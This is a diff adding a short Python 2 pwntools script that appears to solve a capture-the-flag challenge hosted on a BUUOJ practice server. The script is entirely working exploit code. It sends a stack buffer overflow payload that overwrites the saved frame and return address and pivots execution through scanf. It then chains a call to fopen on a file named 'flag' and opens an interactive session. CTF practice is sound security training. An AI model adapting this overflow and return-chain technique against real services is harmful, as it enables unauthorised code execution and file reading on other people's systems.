@@ -1,0 +1,26 @@
+#!/usr/bin/python2
+from pwn import *
+
+def main():
+    bss_addr = 0x0804a800
+    new_ebp = 0x0804a700
+    flag_addr = 0x0804a990
+
+    scanf_addr = 0x080485e6
+    fopen_addr = 0x08048582
+    str_r_addr = 0x080486a0
+
+    r = remote('node3.buuoj.cn',25800)
+
+    payload = b"a"*0x14 + p32(bss_addr) + p32(scanf_addr) + p32(0xdeadbeef) + p32(bss_addr)
+    r.sendline(payload)
+
+    payload = p32(bss_addr+0x10) + p32(scanf_addr) + p32(0xdeadbeef) + p32(flag_addr) + p32(new_ebp) + p32(fopen_addr) + p32(flag_addr) + p32(str_r_addr)
+    r.sendline(payload)
+    r.sendline("flag")
+
+    r.interactive()
+
+if __name__ == "__main__":
+    context.log_level = "debug"
+    main()
